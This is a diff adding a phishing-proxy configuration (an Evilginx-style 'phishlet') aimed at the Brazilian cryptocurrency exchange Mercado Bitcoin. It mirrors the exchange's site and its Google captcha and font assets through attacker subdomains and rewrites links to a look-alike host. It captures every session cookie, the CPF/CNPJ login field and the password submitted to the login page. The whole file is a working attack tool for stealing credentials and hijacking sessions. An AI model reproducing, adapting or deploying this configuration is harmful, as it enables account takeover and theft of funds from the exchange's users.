@@ -1,0 +1,28 @@
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'mercadobitcoin.com.br', session: true, is_landing: true}
+  - {phish_sub: 'captcha', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false}
+
+
+sub_filters:
+  - {triggers_on: 'www.mercadobitcoin.com.br', orig_sub: 'www', domain: 'mercadobitcoin.com.br', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mercadobitcoin.com.br', orig_sub: 'www', domain: 'mercadobitcoin.com.br', search: 'www.google.com', replace: 'captcha.instagram-test.com', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}  
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fonts.gstatic.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.mercadobitcoin.com.br'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: 'cpfcnpj'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.mercadobitcoin.com.br'
+  path: '/conta/login'
